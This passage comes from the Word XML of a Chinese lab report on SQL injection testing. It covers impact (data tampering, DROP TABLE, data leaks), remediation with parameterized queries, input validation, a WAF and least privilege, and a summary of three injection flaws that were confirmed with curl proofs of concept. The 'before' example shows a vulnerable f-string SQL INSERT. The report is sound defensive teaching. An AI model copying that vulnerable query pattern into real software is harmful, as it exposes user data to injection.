              <w:t>攻击者可插入、篡改数据库中的任意数据</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>可用性</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>攻击者可通过 DROP TABLE 等操作破坏数据库</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>合规风险</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>用户个人信息泄露可能导致法律责任</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>八、修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>方案一：参数化查询（推荐）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>使用参数化查询（? 占位符）替代 f-string 拼接，用户输入与 SQL 语句严格分离。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>修复前：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>sql = f"INSERT INTO users (...) VALUES ('{username}', '{password}', '{email}', '{phone}')"</w:t>
        <w:br/>
        <w:t>cursor.execute(sql)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>修复后：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>cursor.execute(</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    (username, password_hash, email, phone)</w:t>
        <w:br/>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>方案二：输入验证</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>对用户输入进行严格的格式验证，限制用户名、密码、邮箱、手机号格式。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>方案三：WAF 防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>部署 Web 应用防火墙（如 SafeLine/长亭雷池）作为应用层防护。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>方案四：最小权限原则</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>数据库连接使用最低权限账户，禁止高危操作。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>九、实验总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本次 SQL 注入漏洞检测实验完成了以下工作：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. 漏洞发现：</w:t>
      </w:r>
      <w:r>
        <w:t>通过代码审计确认搜索和注册功能存在 3 种 SQL 注入漏洞。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. 漏洞验证：</w:t>
      </w:r>
      <w:r>
        <w:t>使用 curl 命令行工具成功复现 3 个 POC，确认所有注入点均可利用。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. 原理解析：</w:t>
      </w:r>
      <w:r>
        <w:t>分析了 UNION 列数匹配、OR 永真条件、-- 注释闭合等关键技术原理。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. 修复建议：</w:t>
      </w:r>
      <w:r>
        <w:t>提出了参数化查询、输入验证、WAF 部署、最小权限等修复方案。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>SQL 注入作为 OWASP Top 1 的安全风险，其危害极大但防御手段成熟。核心防御原则：永远不要将用户输入直接拼接到 SQL 语句中。通过参数化查询或 ORM 框架可有效杜绝 SQL 注入漏洞。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="999999"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>— 报告结束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